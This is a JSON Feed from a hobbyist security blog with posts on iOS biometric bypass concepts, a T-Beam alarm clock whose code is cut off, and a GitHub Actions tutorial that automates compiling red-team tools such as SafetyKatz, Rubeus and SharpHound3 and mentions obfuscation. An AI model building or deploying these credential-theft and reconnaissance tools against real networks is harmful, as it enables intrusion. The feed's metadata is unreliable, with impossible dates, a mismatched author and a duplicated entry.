{
  "version": "https://jsonfeed.org/version/1",
  "title": "potat0ast",
  "home_page_url": "https://potat0ast.com/",
  "feed_url": "https://ronaldsvilcins.com/feed.json",
  "description": "",
  "icon": "https://ronaldsvilcins.com/assets/apple-touch-icon.png",
  "favicon": "https://ronaldsvilcins.com/assets/favicon.ico",
  "expired": false,
  "author": {
    "name": "Ronalds Vilcins",
    "url": "https://ronaldsvilcins.com/"
  },
  "items": [
    
    

    
    {
      "id": "ada7e44084ffa554d71e10459a11f722ecf79975",
      "title": "Bit: iOS Biometrics Bypasses",
      "summary": "",
      "content_text": "Introduction # So I was looking at biometric bypasses on iOS and found myself not understanding why certain applications/app logic could be bypassed with a simple Frida script while others were nothing but trouble.\nSetup # I did some reading. test was super helpful, combined with some Googling and Bard/ChatGPT to help me figure out very basic Obj-C syntax.\nLong story short, one function (the safer one) reaches out to an iOS API that handles keychain items and requests auth from the user. Once authenticated, a key is released to decrypt a particular keychain item (So all of those checks are handled outside the app and the app can do what it needs with the now decrypted keychain item).\nThe other function requests user auth, and based on whether the success boolean is true or false, application logic will execute. Since all of those callback blocks and the logic handling is in the app\u0026rsquo;s context, it can be hooked and modified by Frida. I think. Tell me if I got something wildly wrong xD @M3nn1s for now.\nalso. Test image ",
      "content_html": "\u003ch2 id=\"introduction\"\u003eIntroduction \u003ca href=\"#introduction\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003eSo I was looking at biometric bypasses on iOS and found myself not understanding why certain applications/app logic could be bypassed with a simple Frida script while others were nothing but trouble.\u003c/p\u003e\n\u003ch2 id=\"setup\"\u003eSetup \u003ca href=\"#setup\" class=\"hash\"\u003e#\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"\"\u003e\u003c/a\u003e\n\u003cdiv class=\"box\"\u003e\n  \u003ciframe src=\"\"\u003e\n  \u003c/iframe\u003e\n\u003c/div\u003e\n\nI did some reading. \u003ca href=\"https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass\"\u003etest\u003c/a\u003e\n\u003cdiv class=\"box\"\u003e\n  \u003ciframe src=\"https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass\"\u003e\n  \u003c/iframe\u003e\n\u003c/div\u003e\n was super helpful, combined with some Googling and Bard/ChatGPT to help me figure out very basic Obj-C syntax.\u003c/p\u003e\n\u003cp\u003eLong story short, one function (the safer one) reaches out to an iOS API that handles keychain items and requests auth from the user. Once authenticated, a key is released to decrypt a particular keychain item (So all of those checks are handled outside the app and the app can do what it needs with the now decrypted keychain item).\u003c/p\u003e\n\u003cp\u003eThe other function requests user auth, and based on whether the success boolean is true or false, application logic will execute. Since all of those callback blocks and the logic handling is in the app\u0026rsquo;s context, it can be hooked and modified by Frida. \u003c/p\u003e\n\u003cp\u003eI think. Tell me if I got something wildly wrong xD @M3nn1s for now.\u003c/p\u003e\n\u003cp\u003ealso. Test image\n\u003cimg src=\"/posts/Bit_On_iOS_Biometrics_Bypasses/Test123.png\" alt=\"Test123.png\" loading=\"lazy\" /\u003e\n\u003c/p\u003e\n",
      "url": "https://potat0ast.com/2023/11/28/bit_on_ios_biometrics_bypasses/",
      "image": "https://potat0ast.com/photos/<no value>",
      "banner_image": "https://potat0ast.com/photos/<no value>",
      "date_published": "28116-28-09T1133:2828:00-08:00",
      "date_modified": "28116-28-09T1133:2828:00-08:00",
      "author": {
        "name": "Ronalds Vilcins",
        "url": "https://ronaldsvilcins.com/"
      }
    },
    
    {
      "id": "0a5f122e0ee75fca6d95f88a557241e484f12a00",
      "title": "Github Actions for Red Team Tools",
      "summary": "",
      "content_text": "The usual way to generate red team tools (many C# post-exploit tools) would involve downloading the individual tool from Github, then compiling. On Windows, this was especially tough for me because sometimes the Visual Studio environment would break or it simply involved the extra step of starting a VM. Then there were issues with outdated Git repos and outdated binaries.\nTo get around this and to have Github Actions take care of pretty much all the compiling, I setup an repository that would take care of it. I made heavy reference to and tried to follow this but made a couple changes since a few things have changed since the article was written.\nTo get started with your own CI/CD environment, start by creating a Github repository that will hold the repositories that you want to have compiled. I am going to be using SharpHound3 and some repos from GhostPack.\nWith that done, clone the repo to your local machine to begin adding subrepos to it.\ngit clone git@github.com:Menn1s/tool-builder.git cd tool-builder From here, you can start pulling in an repos that you want (just make sure you know the process to compile it because later steps may vary if it\u0026rsquo;s not one of the repos shown here).\ngit submodule add https://github.com/GhostPack/SafetyKatz.git git submodule add https://github.com/GhostPack/SharpUp.git git submodule add https://github.com/GhostPack/SharpDPAPI.git git submodule add https://github.com/GhostPack/Rubeus.git git submodule add https://github.com/GhostPack/Seatbelt git submodule add https://github.com/BloodHoundAD/SharpHound3.git Once everything has been cloned into the current repository, create your first commit.\ngit add -A git commit -m \u0026#34;first commit\u0026#34; git push Going back to the web UI, click on the Actions tab for your new repository. In short, Github Actions provides us with a way to run workflows remotely using Github\u0026rsquo;s hosted resources. The YAML file used to configure the action will specify the environment and set it up so that it can compile the code we want. If you\u0026rsquo;ve ever worked with Dockerfiles before, this should be familiar. From here, select the Simple workflow and we will fill out the contents with some YAML. It is quite a bit of text, so I will provide a link to the file here and just break down the important parts below. If you want things to just work (assuming nothing has changed with nuget or any of the other moving parts), just copy and paste the YAML, name the file, and commit the change.\nThe top of the YAML document indicates when the action will be run. In our case, we want it to run each time a change is pushed.\non: [push] Then we specify that we want this to run in a Windows environment:\nruns-on: windows-latest Under steps:, we specify the steps needed to complete the action. We need to use actions/checkout@v2 to be able to pull repositories to a location that the workflow can interact with those repositories. The next step is pretty succinctly explained by its name: Checkout submodules. This is the step that gets the code we want to compile into binaries.\n- name: Checkout submodules shell: bash run: | # If your submodules are configured to use SSH instead of HTTPS please uncomment the following line # git config --global url.\u0026#34;https://github.com/\u0026#34;.insteadOf \u0026#34;git@github.com:\u0026#34; auth_header=\u0026#34;$(git config --local --get http.https://github.com/.extraheader)\u0026#34; git submodule sync --recursive git -c \u0026#34;http.extraheader=$auth_header\u0026#34; -c protocol.version=2 submodule update --init --force --recursive --depth=1 These next two steps get the setup-nuget action, then use it to install v1.0.5 of Nuget. Nuget is a package manager and we can use it to grab the packages on which a project depends. We can see nuget restore is used to read the project file to see what the packages are and then install them in our build environment.\n\\- name: Setup NuGet.exe for use with actions uses: NuGet/setup-nuget@v1.0.5 \\- name: Nuget Restore SharpHound3 run: nuget restore $Env:GITHUB_WORKSPACE\\\\SharpHound3\\\\SharpHound3.sln Finally, we have the msbuild command that will actually compile the project into a binary we can use.\n- name: Build SharpHound3 run: | cd \u0026#34;C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\2019\\\\Enterprise\\\\MSBuild\\\\Current\\\\Bin\\\\\u0026#34; .\\\\MSBuild.exe $Env:GITHUB_WORKSPACE\\\\SharpHound3\\\\SharpHound3\\\\SharpHound3.csproj /property:Configuration=Release Because this binary is in the containerized workflow environment, we also need an action to upload the binary to the repository where we can download it later.\n- uses: actions/upload-artifact@master with: name: SharpHound3 path: SharpHound3\\\\SharpHound3\\\\bin\\\\Release\\\\SharpHound.exe These steps repeat for each project repository we have. I used a bit of copy and pasting and vim to make the task a bit less repetitive.\nOnce you have commited the YAML file to describe the workflow, the workflow should actually be triggered. Navigate to the Actions tab for your project. Click on the workflow to see its output. You should be able to see all the binaries you wanted to compile! And that\u0026rsquo;s all there is to it. The post I referenced above also mentions adding some basic obfuscation to the process. Since we have compilation automated, why not go the extra step. The possibilities seem endless, and I definitely want to explore the Github workflows more. Stay toasty!\n",
      "content_html": "\u003cp\u003eThe usual way to generate red team tools (many C# post-exploit tools) would involve downloading the individual tool from Github, then compiling. On Windows, this was especially tough for me because sometimes the Visual Studio environment would break or it simply involved the extra step of starting a VM. Then there were issues with outdated Git repos and outdated binaries.\u003c/p\u003e\n\u003cp\u003eTo get around this and to have Github Actions take care of pretty much all the compiling, I setup an repository that would take care of it. I made heavy reference to and tried to follow \u003ca href=\"https://medium.com/@two06/building-tooling-with-github-actions-59401648e61d\"\u003ethis\u003c/a\u003e but made a couple changes since a few things have changed since the article was written.\u003c/p\u003e\n\u003cp\u003eTo get started with your own CI/CD environment, start by creating a Github repository that will hold the repositories that you want to have compiled. I am going to be using SharpHound3 and some repos from GhostPack.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/posts/Github_Actions_for_Red_Team_Tools/create-repo.png\" alt=\"create-repo.png\" loading=\"lazy\" /\u003e\n\nWith that done, clone the repo to your local machine to begin adding subrepos to it.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone git@github.com:Menn1s/tool-builder.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd tool-builder\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eFrom here, you can start pulling in an repos that you want (just make sure you know the process to compile it because later steps may vary if it\u0026rsquo;s not one of the repos shown here).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule add https://github.com/GhostPack/SafetyKatz.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule add https://github.com/GhostPack/SharpUp.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule add https://github.com/GhostPack/SharpDPAPI.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule add https://github.com/GhostPack/Rubeus.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule add https://github.com/GhostPack/Seatbelt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit submodule add https://github.com/BloodHoundAD/SharpHound3.git\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOnce everything has been cloned into the current repository, create your first commit.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit add -A\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit commit -m \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;first commit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit push\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eGoing back to the web UI, click on the Actions tab for your new repository. In short, Github Actions provides us with a way to run workflows remotely using Github\u0026rsquo;s hosted resources. The YAML file used to configure the action will specify the environment and set it up so that it can compile the code we want. If you\u0026rsquo;ve ever worked with Dockerfiles before, this should be familiar.\n\u003cimg src=\"/posts/Github_Actions_for_Red_Team_Tools/actions-tab.png\" alt=\"actions-tab.png\" loading=\"lazy\" /\u003e\n\nFrom here, select the Simple workflow and we will fill out the contents with some YAML. It is quite a bit of text, so I will provide a link to the file \u003ca href=\"https://raw.githubusercontent.com/Menn1s/tool-builder/master/.github/workflows/builder.yml\"\u003ehere\u003c/a\u003e and just break down the important parts below. If you want things to just work (assuming nothing has changed with nuget or any of the other moving parts), just copy and paste the YAML, name the file, and commit the change.\u003c/p\u003e\n\u003cp\u003eThe top of the YAML document indicates when the action will be run. In our case, we want it to run each time a change is pushed.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-YAML\" data-lang=\"YAML\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eon\u003c/span\u003e: [\u003cspan style=\"color:#ae81ff\"\u003epush]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThen we specify that we want this to run in a Windows environment:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eruns-on\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ewindows-latest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eUnder  \u003ccode\u003esteps:\u003c/code\u003e, we specify the steps needed to complete the action. We need to use \u003ccode\u003eactions/checkout@v2\u003c/code\u003e to be able to pull repositories to a location that the workflow can interact with those repositories. The next step is pretty succinctly explained by its name: Checkout submodules. This is the step that gets the code we want to compile into binaries.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCheckout submodules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eshell\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003erun\u003c/span\u003e: |\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          # If your submodules are configured to use SSH instead of HTTPS please uncomment the following line\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          # git config --global url.\u0026#34;https://github.com/\u0026#34;.insteadOf \u0026#34;git@github.com:\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          auth_header=\u0026#34;$(git config --local --get http.https://github.com/.extraheader)\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          git submodule sync --recursive\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          git -c \u0026#34;http.extraheader=$auth_header\u0026#34; -c protocol.version=2 submodule update --init --force --recursive --depth=1\u003c/span\u003e          \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThese next two steps get the setup-nuget action, then use it to install v1.0.5 of Nuget. Nuget is a package manager and we can use it to grab the packages on which a project depends. We can see \u003ccode\u003enuget restore\u003c/code\u003e is used to read the project file to see what the packages are and then install them in our build environment.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\\- name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eSetup NuGet.exe for use with actions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003euses\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eNuGet/setup-nuget@v1.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003e\\- name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eNuget Restore SharpHound3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003erun\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003enuget restore $Env:GITHUB_WORKSPACE\\\\SharpHound3\\\\SharpHound3.sln\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eFinally, we have the msbuild command that will actually compile the project into a binary we can use.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eBuild SharpHound3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003erun\u003c/span\u003e: |\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          cd \u0026#34;C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\2019\\\\Enterprise\\\\MSBuild\\\\Current\\\\Bin\\\\\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e          .\\\\MSBuild.exe $Env:GITHUB_WORKSPACE\\\\SharpHound3\\\\SharpHound3\\\\SharpHound3.csproj /property:Configuration=Release\u003c/span\u003e          \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eBecause this binary is in the containerized workflow environment, we also need an action to upload the binary to the repository where we can download it later.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#f92672\"\u003euses\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eactions/upload-artifact@master\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ewith\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eSharpHound3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003epath\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eSharpHound3\\\\SharpHound3\\\\bin\\\\Release\\\\SharpHound.exe\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThese steps repeat for each project repository we have. I used a bit of copy and pasting and vim to make the task a bit less repetitive.\u003c/p\u003e\n\u003cp\u003eOnce you have commited the YAML file to describe the workflow, the workflow should actually be triggered. Navigate to the Actions tab for your project.\n\u003cimg src=\"/posts/Github_Actions_for_Red_Team_Tools/actionTabAfterPush.png\" alt=\"actionTabAfterPush.png\" loading=\"lazy\" /\u003e\n\u003c/p\u003e\n\u003cp\u003eClick on the workflow to see its output.\n\u003cimg src=\"/posts/Github_Actions_for_Red_Team_Tools/workflowOut.png\" alt=\"workflowOut.png\" loading=\"lazy\" /\u003e\n\nYou should be able to see all the binaries you wanted to compile! And that\u0026rsquo;s all there is to it. The post I referenced above also mentions adding some basic obfuscation to the process. Since we have compilation automated, why not go the extra step. The possibilities seem endless, and I definitely want to explore the Github workflows more. Stay toasty!\u003c/p\u003e\n",
      "url": "https://potat0ast.com/2021/12/01/github_actions_for_red_team_tools/",
      "image": "https://potat0ast.com/photos/<no value>",
      "banner_image": "https://potat0ast.com/photos/<no value>",
      "date_published": "1126-01-09T128:11:00-08:00",
      "date_modified": "1126-01-09T128:11:00-08:00",
      "author": {
        "name": "Ronalds Vilcins",
        "url": "https://ronaldsvilcins.com/"
      }
    },
    
    {
      "id": "0a5f122e0ee75fca6d95f88a557241e484f12a00",
      "title": "Github Actions for Red Team Tools",
      "summary": "",
      "content_text": " text\n",
      "content_html": "\u003cp\u003e\u003cimg src=\"ferox.png\" alt=\"ferox.png\" loading=\"lazy\" /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://google.com\"\u003etext\u003c/a\u003e\u003c/p\u003e\n",
      "url": "https://potat0ast.com/2021/12/01/github_actions_for_red_team_tools/",
      "image": "https://potat0ast.com/photos/<no value>",
      "banner_image": "https://potat0ast.com/photos/<no value>",
      "date_published": "1126-01-09T128:11:00-08:00",
      "date_modified": "1126-01-09T128:11:00-08:00",
      "author": {
        "name": "Ronalds Vilcins",
        "url": "https://ronaldsvilcins.com/"
      }
    },
    
    {
      "id": "596c3d8babff25d5f50d2f2cb4a4826a43ea9c61",
      "title": "T-Beam Alarm Clock (with NTP!)",
      "summary": "",
      "content_text": "Introduction # SKIP if you just want the How to. Microcontrollers can be fairly difficult to get into. For the most part, if I had any project, I would head straight for github and grab either some code to push through the Arduino IDE or something that could be flashed (with some more magical GUI software). Then, my friend shared with me a project called (Meshtastic)[https://meshtastic.org/] where, using a combination of LORA 915Mhz communication and GPS, you could have an open source device that would let you keep in touch with your party in the great outdoors (without wifi, LTE, or any other more stationary networking resource). I was amazed by what it could do, and I saw that there was just more software to be flashed. So I put in an order for two TTGO T-Beams and waited for them to come in from overseas. Finally they arrived\u0026hellip; but I ordered the wrong ones with no OLED screens. I could probably work with them without the screens, but I was there for an easy ride. So I ordered another 2 (at this point I\u0026rsquo;m pushing a hundred bucks for some side project I don\u0026rsquo;t know will even work). Those show up, I flash them and\u0026hellip;.. GPS does not connect. Needless to say, I did a bit of Googling but couldn\u0026rsquo;t find much, so they started to sit there. Anyway, I needed an alarm because I didn\u0026rsquo;t want an excuse to keep my phone near my bed (since it is the current alarm in use). That thing is an adult pacifier and probably the most appealing thing next to staring at the ceiling. So instead of buying I opted to at least make some use of the hundred dollars spent (wasted).\nSetup # So here are some prerequisites we will need before starting:\nDrivers https://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers for Windows and Mac. From Silabs. Guess we just have to trust it and click next on the install prompts very quickly so the viruses can\u0026rsquo;t multiply. If you\u0026rsquo;re running Linux, I imagine you already know what to do Arduino IDE https://www.arduino.cc/en/software VS Code (not required but it\u0026rsquo;s nice to have) Arduino Libraries ESP8266 and ESP32 OLED driver for SSD1306 displays (yeah it\u0026rsquo;s a mouthful). This gets the little screen to work. WiFi for the esp32 should be built in NTPClient (so time isn\u0026rsquo;t completely off) First download the driver and install it so your usb port can communicate with the UART channels on your board. Unzip the downloaded file, double click on the dmg, double click on the driver installation app, and follow the on-screen prompts to install it.\nOnce that is installed, also install the Arduino IDE if you haven\u0026rsquo;t already. Then open it up and you should be greeted with something like this If you\u0026rsquo;ve never used an Arduino board before, this is just some template code for the board. Anything in the {} after setup() will be run only once. Anything in between the {} after loop() will be run repeatedly\u0026hellip; like in a loop.\nIn order to get the code onto the T-beam board, we will need to add the particular board type into our Arduino installation. To do this, first head to the preferences or settings for the IDE and look for the field called \u0026ldquo;Additional Boards Manager URLs\u0026rdquo;. Add the following URL: https://dl.espressif.com/dl/package_esp32_index.json and open the Boards Manager.\nSearch for the esp32 (by Espressif Systems) and install it. Go back to Tools -\u0026gt; Board -\u0026gt; ESP32 and select the T-Beam. Now, we have essentially configured everything we need to begin communicating with the T-Beam. You can plug in your T-Beam and begin coding and flashing code to your board. However, for more advanced functionality, it is likely that you would install libraries so you don\u0026rsquo;t need to learn how to write code to communicate with a specific OLED screen or how to communicate with a networking chip.\nUnder the Sketch tab, go to \u0026ldquo;Include Library\u0026rdquo; and select \u0026ldquo;Manage Libraries\u0026hellip;\u0026rdquo; The first library we will install is Timelib so that managing time is easier. Go to the search bar and search \u0026ldquo;time\u0026rdquo; or \u0026ldquo;timelib\u0026rdquo; until you find the library shown above. The install button will be in the bottom right if you haven\u0026rsquo;t already installed the library. Proceed to install all of the following libraries as well:\nesp8266 and esp32 OLED driver for ssd1306 displays: It\u0026rsquo;s a pretty self explanatory library name, but it basically makes it easier to use the small displays that are used on arduino boards. For example, you can print text to the screen or draw shapes to the screen. NTPClient: Contains the code that allows the board to communicate using the network time protocol and get accurate, current time/date. WiFi: Contains code to communicate with common WiFi protocols. Should be installed by default. That is all for the libraries we\u0026rsquo;ll be needing. Now here is the code. I will try to comment everything as clearly as possible. Otherwise it should just work once you change the wifi details to suit your access point.\n#include \u0026#34;SSD1306Wire.h\u0026#34; #include \u0026lt;WiFi.h\u0026gt; #include \u0026lt;NTPClient.h\u0026gt; #include \u0026lt;TimeLib.h\u0026gt; #include \u0026#34;pitches.h\u0026#34; // see pitches.h file below. It is another file in the same project // set wifi variables const char* ssid = \u0026#34;SSID\u0026#34;; const char* password = \u0026#34;PASSWORD\u0026#34;; // set the display SSD1306Wire display(0x3c, SDA, SCL); // Define NTP client to get time WiFiUDP ntpUDP; NTPClient timeClient(ntpUDP); // Variables to save date and time String formattedDate; String dayStamp; String timeStamp; // connect to WiFi function void connectToWiFi() { Serial.print(\u0026#34;Connecting to WiFi\u0026#34;); // set wifi to station mode (client mode) WiFi.mode(WIFI_STA); WiFi.begin(ssid, password); int attempt = 0; // while loop that adds a dot for each second that the status is not connected yet while(WiFi.status() != WL_CONNECTED){ Serial.print(\u0026#34;.\u0026#34;); // print a dot to serial display.drawString(attempt, 0, \u0026#34;.\u0026#34;); // draw a dot next to the last one. display.display(); // refresh the display so what was drawn actually shows attempt++; // increase the attempt counter (acts as x axis for dots being printed) delay(1000); } } // utility function for digital clock display: prints leading 0 String twoDigits(int digits){ if(digits \u0026lt; 10) { String i = \u0026#39;0\u0026#39;+String(digits); return i; } else { return String(digits); } } // plays a tone from a particular pin for a set amount of time void tone(byte pin, int freq, int length) { ledcSetup(0, 2000, 8); // setup beeper ledcAttachPin(pin, 0); // attach beeper ledcWriteTone(0, freq); // play tone delay(length); // play for as long as specified ledcWriteTone(0, 0); // then turn off } void playMelody() { // notes in the melody: int melody[] = { NOTE_C4, NOTE_G3, NOTE_G3, NOTE_A3, NOTE_G3, 0, NOTE_B3, NOTE_C4 }; // note durations: 4 = quarter note, 8 = eighth note, etc.: int noteDurations[] = { 4, 8, 8, 4, 4, 4, 4, 4 }; // loop to play the melody specified for (int thisNote = 0; thisNote \u0026lt; sizeof(melody)/sizeof(melody[0]); thisNote++) { tone(14, melody[thisNote], 1000/noteDurations[thisNote]); } } void setup() { // set the baud rate and print newlines to serial Serial.begin(9600); Serial.println(); Serial.println(); // initialize the display and set font display.init(); display.flipScreenVertically(); display.setFont(ArialMT_Plain_10); connectToWiFi(); // set pin 14 for output pinMode(14, OUTPUT); playMelody(); display.drawString(0, 0, \u0026#34;hello\u0026#34;); display.display(); delay(3000); display.clear(); // show the mac address in serial and on the screen Serial.print(\u0026#34;ESP Board MAC Address: \u0026#34;); Serial.println(WiFi.macAddress()); display.drawString(0, 10, \u0026#34;ESP Board MAC Address: \u0026#34;); display.drawString(0, 20, WiFi.macAddress()); display.display(); // show the IP address on screen display.drawString(0, 40, \u0026#34;ESP Board IP Address: \u0026#34;); display.drawString(0, 50, WiFi.localIP().toString()); display.display(); // start the time client and set timezone GMT -8 timeClient.begin(); timeClient.setTimeOffset(-25200); delay(5000); // get the datetime while(!timeClient.update()) { timeClient.forceUpdate(); } // Extract Date and Time formattedDate = 